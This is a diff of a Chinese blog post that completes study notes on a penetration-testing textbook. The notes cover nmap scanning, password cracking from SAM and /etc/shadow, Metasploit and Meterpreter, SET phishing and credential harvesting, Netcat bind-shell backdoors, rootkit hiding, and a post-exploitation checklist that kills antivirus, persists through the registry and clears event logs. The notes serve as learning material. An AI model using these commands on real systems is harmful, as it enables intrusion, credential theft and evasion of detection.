@@ -90,19 +90,19 @@
 
 
 
-<meta name="description" content="待更……">
+<meta name="description" content="完结…很多情况下，作为渗透测试人员，你的工作越出色，别人也就越不会关注或 “ 感受到 ”你的工作。">
 <meta name="keywords" content="PENTEST">
 <meta property="og:type" content="article">
 <meta property="og:title" content="《渗透测试实践指南》笔记">
 <meta property="og:url" content="http://yoursite.com/2018/11/11/《渗透测试实践指南》笔记/index.html">
 <meta property="og:site_name" content="cold">
-<meta property="og:description" content="待更……">
+<meta property="og:description" content="完结…很多情况下，作为渗透测试人员，你的工作越出色，别人也就越不会关注或 “ 感受到 ”你的工作。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/images/penetration_testing.jpg">
-<meta property="og:updated_time" content="2018-11-11T10:41:07.167Z">
+<meta property="og:updated_time" content="2019-03-06T14:20:07.418Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="《渗透测试实践指南》笔记">
-<meta name="twitter:description" content="待更……">
+<meta name="twitter:description" content="完结…很多情况下，作为渗透测试人员，你的工作越出色，别人也就越不会关注或 “ 感受到 ”你的工作。">
 <meta name="twitter:image" content="http://yoursite.com/images/penetration_testing.jpg">
 
 
@@ -378,7 +378,7 @@
 
       
         <p><div align="center"><img src="/images/penetration_testing.jpg" alt=""></div></p>
-<p>待更……</p>
+<p>完结…很多情况下，作为渗透测试人员，你的工作越出色，别人也就越不会关注或 “ 感受到 ”你的工作。</p>
 <a id="more"></a>
 <hr>
 <h1 id="一-侦查"><a href="#一-侦查" class="headerlink" title="一. 侦查"></a>一. 侦查</h1><ul>
@@ -419,7 +419,232 @@ nslookup
 <li><strong>Maltego</strong></li>
 <li><strong>Robertex</strong></li>
 </ol>
-<p>待更……</p>
+<h1 id="二-扫描"><a href="#二-扫描" class="headerlink" title="二. 扫描"></a>二. 扫描</h1><ul>
+<li>端口扫描：namp</li>
+<li>漏洞扫描:Nessus、OpenVAS</li>
+<li>ip → 端口、服务</li>
+</ul>
+<h2 id="1-PING"><a href="#1-PING" class="headerlink" title="1. PING"></a>1. PING</h2><p>网络连接的可靠性，ICMP，防火墙等设备可能会抑制ping包</p>
+<p><code>fping -a(只显示活动的主机) -q（静默） -s(显示统计数据) -g target_ip_list &gt; &quot;output_file&quot;</code></p>
+<h2 id="2-Nmap"><a href="#2-Nmap" class="headerlink" title="2. Nmap"></a>2. Nmap</h2><p>端口服务扫描器，NetBIOS(137-139)，RDP(3389)，MSSQL(1433)， VNC(5800/5900)</p>
+<ol>
+<li><code>nmap -s/sS -p-(所有端口) -Pn(跳过主机发现) target_ip/-iL ip_list_path</code>：默认的SYN扫描，只完成三次握手前两步</li>
+<li><code>-sT</code>：TCP扫描</li>
+<li><code>-sUV</code>：UDP扫描，非常慢，没有<code>-p-</code>和<code>-Pn</code>参数 , DHCP（67/68）/DNS/SNMP(161/162)/TFTP(69)都是基于UDP的 </li>
+<li><code>-sX</code>：Xmas Tree扫描 , SYN和ACK标记未被置位，针对Linux/Unix系统，针对100%针对TCP RFC文档建议的操作系统, 关闭的端口会响应RST数据包，开放的端口会忽略。某些情况可以绕过简单的数据包过滤和访问控制列表（ACLs） </li>
+<li><code>-sN</code>：Null扫描 , 同Xmas</li>
+<li><code>-sV</code>：版本扫描，<strong>尽可能多用</strong>，<code>-T</code>：扫描时间，<code>-O</code>：操作系统</li>
+<li><strong>NSE</strong>：<code>namp --script banner/vuln target_ip</code>,  目录（/usr/share/nmap/scripts），端口扫描、漏洞扫描、网络发现、后门检测、漏洞利用··· <a href="https://nmap.org/nsedoc/" target="_blank" rel="noopener">https://nmap.org/nsedoc/</a></li>
+</ol>
+<h2 id="3-Nessus、OpenVAS"><a href="#3-Nessus、OpenVAS" class="headerlink" title="3. Nessus、OpenVAS"></a>3. Nessus、OpenVAS</h2><p>漏洞扫描</p>
+<h1 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三. 漏洞利用"></a>三. 漏洞利用</h1><h2 id="1-在线密码破解"><a href="#1-在线密码破解" class="headerlink" title="1. 在线密码破解"></a>1. 在线密码破解</h2><ul>
+<li><strong>Medusa、Hydra</strong></li>
+<li>获取远程服务访问权限</li>
+<li>密码列表：①RockYou(/usr/share/wordlists)、②John the Riper(jtr)（/usr/share/john/password.lst）</li>
+</ul>
+<p><code>medusa -h target_ip -u/U _username -p/P password -M target_service</code></p>
+<h2 id="2-漏洞利用框架"><a href="#2-漏洞利用框架" class="headerlink" title="2. 漏洞利用框架"></a>2. 漏洞利用框架</h2><ul>
+<li><strong>Metasploit</strong></li>
+<li>漏洞攻击程序、攻击载荷</li>
+<li><code>msfconsole</code>：启动Metasploit</li>
+<li><code>msfupdate</code>：升级Metasploit</li>
+</ul>
+<pre>
+msf> search missing_patch_number(or CVE)/year ：搜索漏洞攻击程序
+msf> use exploit_path ：选择漏洞攻击程序
+msf> show payloads ：显示可用的攻击载荷
+msf> set payload payload_path ：选择攻击载荷
+msf> show options ：显示需要配置的选项
+msf> set option_name : 配置选项
+msf> exploit ：发动漏洞攻击
+</pre>
+
+<h3 id="攻击载荷：VNC、Meterpreter☆…"><a href="#攻击载荷：VNC、Meterpreter☆…" class="headerlink" title="攻击载荷：VNC、Meterpreter☆…"></a>攻击载荷：VNC、Meterpreter☆…</h3><ul>
+<li><strong>Meterpreter：</strong>完全在内存中运行，强大的命令行shell，migrate …</li>
+</ul>
+<h2 id="3-离线密码破解"><a href="#3-离线密码破解" class="headerlink" title="3. 离线密码破解"></a>3. 离线密码破解</h2><ul>
+<li>John the Ripper</li>
+<li>获取密码散列（hash），将密码散列转化为明文</li>
+<li><code>john --test</code>：基准衡量，每秒破解次数（c/s）</li>
+</ul>
+<h3 id="1）本地密码破解（windows）："><a href="#1）本地密码破解（windows）：" class="headerlink" title="1）本地密码破解（windows）："></a>1）本地密码破解（windows）：</h3><ul>
+<li>SAM（安全账号管理器）   </li>
+</ul>
+<h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><ol>
+<li>启动Live CD  </li>
+<li><code>mkdir /mnt/sda1</code>：创建一个挂载点<br><code>fdisk -l</code>：查看本地可用驱动器<br><code>mount /dev/sda1 /mnt/sda1</code>：挂载包含SAM文件的驱动器</li>
+<li><code>cd /mnt/sda1/Windows/system32/config</code>：进入包含SAM的文件夹</li>
+<li><code>ls</code>：定位SAM文件及system文件</li>
+<li><code>samdump2 system SAM &gt; /tmp/hashes.txt</code>：利用SamDump2工具提取散列<br><code>bkhive system sys_key.txt</code>,<code>samdump2 SAM sys_key.txt &gt; /tmp/hash.txt</code>：有时需要先利用Bkhive工具提取系统秘钥</li>
+<li><code>john /tmp/hashes.txt --format = nt</code>：利用JtR破解密码，<code>--format = nt</code>指定了密码散列类型为NTLM</li>
+</ol>
+<h3 id="2）远程密码破解（windows）："><a href="#2）远程密码破解（windows）：" class="headerlink" title="2）远程密码破解（windows）："></a>2）远程密码破解（windows）：</h3><h4 id="步骤：-1"><a href="#步骤：-1" class="headerlink" title="步骤："></a>步骤：</h4><ol>
+<li>对远程目标系统发动Meterpreter攻击载荷的漏洞攻击</li>
+<li><code>meterpreter &gt; hashdump</code>：在meterpreter shell中提取远程目标系统密码散列</li>
+<li>利用JtR破解密码</li>
+</ol>
+<h3 id="3）Linux密码破解："><a href="#3）Linux密码破解：" class="headerlink" title="3）Linux密码破解："></a>3）Linux密码破解：</h3><ul>
+<li>密码散列包含在‘/etc/shadow’文件里</li>
+<li><code>unshadow /etc/passwd /etc/shadow &gt; /tmp/linux_hashes.txt</code>：利用JtR的特殊功能合并’/etc/shadow’文件和‘/etc/passwd’文件，输出包含原始散列的列表</li>
+<li>使用能够破解SHA散列的JtRb版本破解密码</li>
+</ul>
+<h2 id="4-密码重置"><a href="#4-密码重置" class="headerlink" title="4. 密码重置"></a>4. 密码重置</h2><ol>
+<li>获取目标系统物理访问权限</li>
+<li>启动kali live CD</li>
+<li>挂载包含SAM文件的驱动器</li>
+<li><code>chntpw -h</code>：查看<code>chntpw</code>命令的参数及选项</li>
+<li><code>chntpw -i /mnt/sda1/WINDOWS/system32/config/SAM</code>：以交互模式运行<code>chntpw</code>程序</li>
+</ol>
+<h2 id="5-网络流量嗅探：Dsniff、Wireshark"><a href="#5-网络流量嗅探：Dsniff、Wireshark" class="headerlink" title="5. 网络流量嗅探：Dsniff、Wireshark"></a>5. 网络流量嗅探：Dsniff、Wireshark</h2><ol>
+<li>将网卡设置为“混杂模式”</li>
+<li><code>macof -i eth0 -s source_ip -d target_ip</code>：利用Dsniff中的一个工具Macof生成几千个随机MAC地址对交换机进行泛洪攻击，强迫交换机按集线器的工作方式运行</li>
+<li><code>wireshark</code>：网络流量过滤分析</li>
+</ol>
+<h2 id="6-Armitige：一站式漏洞利用工具"><a href="#6-Armitige：一站式漏洞利用工具" class="headerlink" title="6. Armitige：一站式漏洞利用工具"></a>6. Armitige：一站式漏洞利用工具</h2><ul>
+<li>在Metasploit上运行、GUI驱动的前端程序</li>
+<li>“Haly Mary”功能：根据端口扫描信息，发动所有可能匹配的漏洞攻击</li>
+</ul>
+<h2 id="7-其他高级漏洞利用工具"><a href="#7-其他高级漏洞利用工具" class="headerlink" title="7. 其他高级漏洞利用工具"></a>7. 其他高级漏洞利用工具</h2><ol>
+<li>Medusa、Hydra：密码破解、获取远程服务权限</li>
+<li>RainbowCrack：利用彩虹表（Rainbow table）对密码进行破解,预先计算好密码散列</li>
+<li>Dsniff、Wireshark、Tcpdump</li>
+<li>Ettercap：中间人攻击</li>
+<li>Exploit-DB：漏洞利用和POC代码的公开知识库</li>
+</ol>
+<h1 id="四-社会工程（SET）"><a href="#四-社会工程（SET）" class="headerlink" title="四. 社会工程（SET）"></a>四. 社会工程（SET）</h1><ul>
+<li>用于社会工程的漏洞利用框架，快速创建高级攻击向量</li>
+<li>菜单驱动，配置文件：/usr/share/setoolkit/config/set_config</li>
+<li>运行之前一定要更新</li>
+</ul>
+<p><code>se-toolkit</code>：启动SET主界面</p>
+<h2 id="社会工程菜单下的内容"><a href="#社会工程菜单下的内容" class="headerlink" title="社会工程菜单下的内容"></a>社会工程菜单下的内容</h2><ol>
+<li>Spear-Phishing Attack Vectors：钓鱼式攻击，制作包含恶意附件的电子邮件</li>
+<li>Website Attack Vectors：网站攻击向量</li>
+<li>Infectious Media Generator：生成带有恶意攻击载荷的U盘</li>
+<li>Create a Payload and Listener：前提已经能够访问目标系统，希望部署更隐蔽的SET载荷，更好地避开防病毒产品</li>
+<li>Mass Mailer Attack：发送大量邮件</li>
+<li>Arduino-Based Attack Vector☆：将“Teensy”设备编程为键盘，绕过自动运行，模拟键盘并在目标设备上打开一个后门，获得完整Meterpreter Shell</li>
+<li>SMS Spoofing Attack Vector：伪造短信</li>
+<li>Wireless Access Point Attack Vector：创建伪Wifi站点，重定向</li>
+<li>QRcode Generator Attack Vector：创建重定向二维码</li>
+<li>Powershell Attack Vectors：生成一系列可以在控制系统之后执行的Powershell攻击代码，可以绕过执行限制策略</li>
+</ol>
+<h2 id="“Website-Attack-Vectors”菜单下的内容"><a href="#“Website-Attack-Vectors”菜单下的内容" class="headerlink" title="“Website Attack Vectors”菜单下的内容"></a>“Website Attack Vectors”菜单下的内容</h2><ol>
+<li>1)Java Applet Attack Method：Java小脚本攻击</li>
+<li>3)Credential Harvester Attack Method：凭据采集者</li>
+<li>7)Muti-Attack Web Method：多重攻击向量</li>
+</ol>
+<h3 id="1-Java小脚本攻击："><a href="#1-Java小脚本攻击：" class="headerlink" title="1) Java小脚本攻击："></a>1) Java小脚本攻击：</h3><p>向网页注入恶意脚本，安装Web服务器，创建攻击载荷</p>
+<h4 id="步骤：-2"><a href="#步骤：-2" class="headerlink" title="步骤："></a>步骤：</h4><ol>
+<li><code>Site Cloner</code>：克隆网页</li>
+<li><code>15)PyInjector shellcode Injetion</code>：直接向内存注入shellcode，不需要接触磁盘，能够完全骗过防病毒产品，类似Meterpreter</li>
+<li>指定回连端口，选择攻击载荷，通常选<code>Windows Meterpreter reverse TCP payload</code></li>
+<li>发送恶意链接，等待获取Shell</li>
+</ol>
+<h3 id="3-凭据采集者："><a href="#3-凭据采集者：" class="headerlink" title="3) 凭据采集者："></a>3) 凭据采集者：</h3><p>针对用户可能输入用户名密码的可信站点</p>
+<h4 id="步骤：-3"><a href="#步骤：-3" class="headerlink" title="步骤："></a>步骤：</h4><ol>
+<li><code>Site Cloner</code>：克隆网站</li>
+<li>指定回连IP，发送恶意链接，等待捕捉用户凭据  </li>
+</ol>
+<h1 id="五-基于Web的漏洞利用"><a href="#五-基于Web的漏洞利用" class="headerlink" title="五. 基于Web的漏洞利用"></a>五. 基于Web的漏洞利用</h1><h2 id="1-Nikto"><a href="#1-Nikto" class="headerlink" title="1. Nikto"></a>1. Nikto</h2><p>Web服务器漏洞扫描工具<br><code>nikto</code>：查看Nikto的各种选项设置<br><code>nikto -h target_ip -p _port -o storage_file_path</code></p>
+<h2 id="2-W3AF"><a href="#2-W3AF" class="headerlink" title="2. W3AF"></a>2. W3AF</h2><p>Web资源扫描和漏洞利用工具，提供了易用的界面<br><code>w3af</code>：启动W3AF</p>
+<h2 id="3-WebScarab"><a href="#3-WebScarab" class="headerlink" title="3. WebScarab"></a>3. WebScarab</h2><p>web代理框架，本质是模块化，允许用户加载大量的插件以满足定制的需要</p>
+<ul>
+<li><code>webscarab</code>：启动WebScarab  </li>
+<li>把WebScarab配置为代理服务器</li>
+</ul>
+<ol>
+<li>网络爬虫：<code>&quot;Use full-featured interface&quot;</code>  </li>
+<li>拦截请求：<code>&quot;Use Lite Interface&quot;</code></li>
+</ol>
+<h2 id="4-Zed-Attack-Proxy（ZAP）"><a href="#4-Zed-Attack-Proxy（ZAP）" class="headerlink" title="4. Zed Attack Proxy（ZAP）"></a>4. Zed Attack Proxy（ZAP）</h2><p>全功能Web入侵工具包，拦截代理、爬虫和漏洞扫描（漏洞扫描程序和Nessus很相似，加载了已知漏洞的特征，扫描程序的好坏取决于所包含的特征）  </p>
+<ul>
+<li><code>zap</code>：启动ZAP  </li>
+<li>配置浏览器使用代理，端口号8080</li>
+</ul>
+<h2 id="5-其他相关"><a href="#5-其他相关" class="headerlink" title="5. 其他相关"></a>5. 其他相关</h2><ol>
+<li>脆弱平台：WebGoat、Damn Vulnerable Web App（DVWA）</li>
+<li>开放Web应用程序安全项目（OWASP）：Web安全真正的领袖，OWASP Top Ten项目</li>
+<li>其他代理：WebScarab、Burp Proxy、Paros Proxy</li>
+<li>Burp Suite：当前最出色的Web应用测试工具</li>
+</ol>
+<h1 id="六-维持访问"><a href="#六-维持访问" class="headerlink" title="六. 维持访问"></a>六. 维持访问</h1><p>后门、隐藏、迁移shell</p>
+<h2 id="1-Netcat：瑞士军刀"><a href="#1-Netcat：瑞士军刀" class="headerlink" title="1. Netcat：瑞士军刀"></a>1. Netcat：瑞士军刀</h2><ul>
+<li>允许通信和网络流量从一台计算机流向另一台计算机的工具</li>
+<li>后门的最佳选择、传递文件、端口扫描、即时消息、搭建Web服务器</li>
+<li>服务器、客户端</li>
+</ul>
+<h3 id="1）配置为连接两台计算机的通信通道"><a href="#1）配置为连接两台计算机的通信通道" class="headerlink" title="1）配置为连接两台计算机的通信通道"></a>1）配置为连接两台计算机的通信通道</h3><ul>
+<li>服务器：<code>nc -l(置为监听模式) -p _port</code>  </li>
+<li>客户端：<code>nc server_ip _port</code></li>
+</ul>
+<h5 id="保持连接持久性："><a href="#保持连接持久性：" class="headerlink" title="保持连接持久性："></a>保持连接持久性：</h5><ul>
+<li>windows：①用<code>-L</code>参数，②添加注册表自启动</li>
+<li>Linux：通过写bash脚本让Netcat在初始连接关闭时重新启动</li>
+</ul>
+<h3 id="2）文件传输"><a href="#2）文件传输" class="headerlink" title="2）文件传输"></a>2）文件传输</h3><h4 id="上传-下载："><a href="#上传-下载：" class="headerlink" title="上传/下载："></a>上传/下载：</h4><ul>
+<li>服务器：<code>nc -l -p _port &gt; virus.exe</code>  </li>
+<li>客户端：<code>nc server_ip _port &lt; virus.exe</code></li>
+<li>下载时以攻击机作为服务器</li>
+</ul>
+<h3 id="3）识别端口服务"><a href="#3）识别端口服务" class="headerlink" title="3）识别端口服务"></a>3）识别端口服务</h3><ul>
+<li><code>nc server_ip unknown_port</code>：强制Netcat试图连接到未知服务，<code>-u</code> 参数发送UDP数据包</li>
+<li>输入文本传递给目标服务，等待回应</li>
+</ul>
+<h3 id="4）绑定进程，配置后门"><a href="#4）绑定进程，配置后门" class="headerlink" title="4）绑定进程，配置后门"></a>4）绑定进程，配置后门</h3><ul>
+<li><code>nc -l -p _port -e /bin/sh</code>：Linux</li>
+<li><code>nc -L -p _port -e c:\Windows\System32\cmd.exe</code>：Windows</li>
+</ul>
+<h2 id="2-Cryptcat"><a href="#2-Cryptcat" class="headerlink" title="2. Cryptcat"></a>2. Cryptcat</h2><p>对Netcat客户端和服务器端的流量进行加密</p>
+<ul>
+<li>使用<code>-k</code>参数更改默认的Key值metallica  </li>
+<li>服务器：<code>cryptcat -l -p _port</code></li>
+<li>客户端：<code>cryptcat server_ip _port</code></li>
+</ul>
+<h2 id="3-Rootkit"><a href="#3-Rootkit" class="headerlink" title="3. Rootkit"></a>3. Rootkit</h2><p>隐藏文件、进程、程序，保持后门访问的隐蔽性，躲过即使是最强大的杀毒软件的查杀，通过“挂钩（hooking）”或拦截软件与操作系统之间的各种请求</p>
+<h3 id="Hacker-Defender（Windows-Rootkit）"><a href="#Hacker-Defender（Windows-Rootkit）" class="headerlink" title="Hacker Defender（Windows Rootkit）"></a>Hacker Defender（Windows Rootkit）</h3><p>一个Windows Rootkit</p>
+<h4 id="三个主要文件："><a href="#三个主要文件：" class="headerlink" title="三个主要文件："></a>三个主要文件：</h4><ul>
+<li>hxdef100.exe：可执行文件，目标计算机上运行Hacker Defender</li>
+<li>hxdef100.ini：配置文件</li>
+<li>bdcli100.exe：客户端软件，连接Hacker Defender的后门</li>
+</ul>
+<h4 id="hxdef100-ini："><a href="#hxdef100-ini：" class="headerlink" title="hxdef100.ini："></a>hxdef100.ini：</h4><ul>
+<li>[Hidden Table]：对Windows资源管理器和文件管理器是隐藏的</li>
+<li>[Hidden Processes]：对用户隐藏的进程或程序，无法在任务管理器中看到</li>
+<li>[Root Processes]：可以用来交互的程序以及可以查看到的但在之前已经隐藏了的文件夹和进程</li>
+<li>[Hidden Service]：隐藏所有以服务的方式安装或运行的程序，无法再任务管理器中看到</li>
+<li>[Hidden Regkeys]：隐藏特定的注册表键</li>
+<li>[Hidden RegValues]：隐藏注册表键值</li>
+<li>[Startup Run]：在Hacker Defender启动之后自动运行的程序，放置后门程序，如Natcat命令并确保Netcat运行在监听模式</li>
+<li>[Free Space]：强制将已经使用的磁盘空间“加回到”可用磁盘空间中</li>
+<li>[Hidden Port]：隐藏端口，进一步被细分为TCPI、TCPO、UDP子节</li>
+</ul>
+<h4 id="发现隐藏文件和Rootkit的工具："><a href="#发现隐藏文件和Rootkit的工具：" class="headerlink" title="发现隐藏文件和Rootkit的工具："></a>发现隐藏文件和Rootkit的工具：</h4><ul>
+<li>Rootkit Revealer、vice、F-Secure的Blacklight</li>
+</ul>
+<h2 id="4-Meterpreter"><a href="#4-Meterpreter" class="headerlink" title="4. Meterpreter"></a>4. Meterpreter</h2><p>一个无所不能的Metasploit攻击载荷，包含一些列內建命令，使攻击者快速轻松从“漏洞利用”阶段转向“漏洞利用后”阶段</p>
+<h3 id="步骤：-4"><a href="#步骤：-4" class="headerlink" title="步骤："></a>步骤：</h3><ol>
+<li>进行漏洞利用，对目标使用Meterpreter攻击载荷</li>
+<li>使用“migrate”命令将Meterpreter转移到不为人熟知的常见进程中，如服务主机（svchost.exe）</li>
+<li>“kill”命令禁用防病毒软件</li>
+<li>“shell”命令访问目标系统命令提示符，使用“netsh advfirewall firewall”命令更改Windows防火墙设置（使连接或端口开放）</li>
+<li>使用“upload”命令上传Rootkit、nmap、Metasploit、John the Ripper等工具包</li>
+<li>“execute -f”命令安装rootkit</li>
+<li>若rootkit没有包含后门，用“execute -f”安装Netcat作为永久后门</li>
+<li>“reg”命令修改注册表，使Netcat持久化</li>
+<li>“hashdump”命令转储密码散列，使用jtr破解密码</li>
+<li>“edit”命令配置rootkit.ini文件，隐藏上传的文件、后门、新打开的端口</li>
+<li>从攻击机器建立到目标的新连接，测试上传的后门</li>
+<li>“clearev”命令清除事件日志</li>
+<li>攻击下一个目标 </li>
+</ol>
+<h2 id="5-其他"><a href="#5-其他" class="headerlink" title="5. 其他"></a>5. 其他</h2><p>Ncat、Socat：Netcat的高级工具<br>Netbus、Back Orifice、Subseven(Sub7)：后门</p>
+<p><strong>一些资源：</strong></p>
+<ol>
+<li><a href="http://sourceforge.net/projects/Metasploitable" target="_blank" rel="noopener">Metasploitable : 一个有漏洞的Ubuntu</a></li>
+<li><a href="http://www.pentest-standard.org" target="_blank" rel="noopener">渗透测试执行标准（PTES）</a></li>
+<li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">EXPLOIT DATABASE</a></li>
+</ol>
 
       
     </div>
@@ -487,6 +712,10 @@ nslookup
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/03/06/《数学之美》笔记/" rel="prev" title="《数学之美》笔记">
+                《数学之美》笔记 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -556,7 +785,7 @@ nslookup
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-count">7</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -569,7 +798,7 @@ nslookup
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -615,7 +844,7 @@ nslookup
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一-侦查"><span class="nav-number">1.</span> <span class="nav-text">一. 侦查</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-HTTrack"><span class="nav-number">1.1.</span> <span class="nav-text">1. HTTrack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Google指令"><span class="nav-number">1.2.</span> <span class="nav-text">2. Google指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-The-Harvester"><span class="nav-number">1.3.</span> <span class="nav-text">3. The Harvester</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-whois"><span class="nav-number">1.4.</span> <span class="nav-text">4. whois</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Netcraft"><span class="nav-number">1.5.</span> <span class="nav-text">5. Netcraft</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-host"><span class="nav-number">1.6.</span> <span class="nav-text">6. host</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-NS-lookup、Dig、fierce"><span class="nav-number">1.7.</span> <span class="nav-text">7. NS lookup、Dig、fierce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-MetaGooFil"><span class="nav-number">1.8.</span> <span class="nav-text">8. MetaGooFil</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-其它"><span class="nav-number">1.9.</span> <span class="nav-text">9. 其它</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一-侦查"><span class="nav-number">1.</span> <span class="nav-text">一. 侦查</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-HTTrack"><span class="nav-number">1.1.</span> <span class="nav-text">1. HTTrack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Google指令"><span class="nav-number">1.2.</span> <span class="nav-text">2. Google指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-The-Harvester"><span class="nav-number">1.3.</span> <span class="nav-text">3. The Harvester</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-whois"><span class="nav-number">1.4.</span> <span class="nav-text">4. whois</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Netcraft"><span class="nav-number">1.5.</span> <span class="nav-text">5. Netcraft</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-host"><span class="nav-number">1.6.</span> <span class="nav-text">6. host</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-NS-lookup、Dig、fierce"><span class="nav-number">1.7.</span> <span class="nav-text">7. NS lookup、Dig、fierce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-MetaGooFil"><span class="nav-number">1.8.</span> <span class="nav-text">8. MetaGooFil</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-其它"><span class="nav-number">1.9.</span> <span class="nav-text">9. 其它</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二-扫描"><span class="nav-number">2.</span> <span class="nav-text">二. 扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-PING"><span class="nav-number">2.1.</span> <span class="nav-text">1. PING</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Nmap"><span class="nav-number">2.2.</span> <span class="nav-text">2. Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Nessus、OpenVAS"><span class="nav-number">2.3.</span> <span class="nav-text">3. Nessus、OpenVAS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三-漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">三. 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-在线密码破解"><span class="nav-number">3.1.</span> <span class="nav-text">1. 在线密码破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞利用框架"><span class="nav-number">3.2.</span> <span class="nav-text">2. 漏洞利用框架</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击载荷：VNC、Meterpreter☆…"><span class="nav-number">3.2.1.</span> <span class="nav-text">攻击载荷：VNC、Meterpreter☆…</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-离线密码破解"><span class="nav-number">3.3.</span> <span class="nav-text">3. 离线密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1）本地密码破解（windows）："><span class="nav-number">3.3.1.</span> <span class="nav-text">1）本地密码破解（windows）：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤："><span class="nav-number">3.3.1.1.</span> <span class="nav-text">步骤：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2）远程密码破解（windows）："><span class="nav-number">3.3.2.</span> <span class="nav-text">2）远程密码破解（windows）：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤：-1"><span class="nav-number">3.3.2.1.</span> <span class="nav-text">步骤：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3）Linux密码破解："><span class="nav-number">3.3.3.</span> <span class="nav-text">3）Linux密码破解：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-密码重置"><span class="nav-number">3.4.</span> <span class="nav-text">4. 密码重置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-网络流量嗅探：Dsniff、Wireshark"><span class="nav-number">3.5.</span> <span class="nav-text">5. 网络流量嗅探：Dsniff、Wireshark</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-Armitige：一站式漏洞利用工具"><span class="nav-number">3.6.</span> <span class="nav-text">6. Armitige：一站式漏洞利用工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-其他高级漏洞利用工具"><span class="nav-number">3.7.</span> <span class="nav-text">7. 其他高级漏洞利用工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#四-社会工程（SET）"><span class="nav-number">4.</span> <span class="nav-text">四. 社会工程（SET）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#社会工程菜单下的内容"><span class="nav-number">4.1.</span> <span class="nav-text">社会工程菜单下的内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#“Website-Attack-Vectors”菜单下的内容"><span class="nav-number">4.2.</span> <span class="nav-text">“Website Attack Vectors”菜单下的内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Java小脚本攻击："><span class="nav-number">4.2.1.</span> <span class="nav-text">1) Java小脚本攻击：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤：-2"><span class="nav-number">4.2.1.1.</span> <span class="nav-text">步骤：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-凭据采集者："><span class="nav-number">4.2.2.</span> <span class="nav-text">3) 凭据采集者：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤：-3"><span class="nav-number">4.2.2.1.</span> <span class="nav-text">步骤：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#五-基于Web的漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">五. 基于Web的漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Nikto"><span class="nav-number">5.1.</span> <span class="nav-text">1. Nikto</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-W3AF"><span class="nav-number">5.2.</span> <span class="nav-text">2. W3AF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 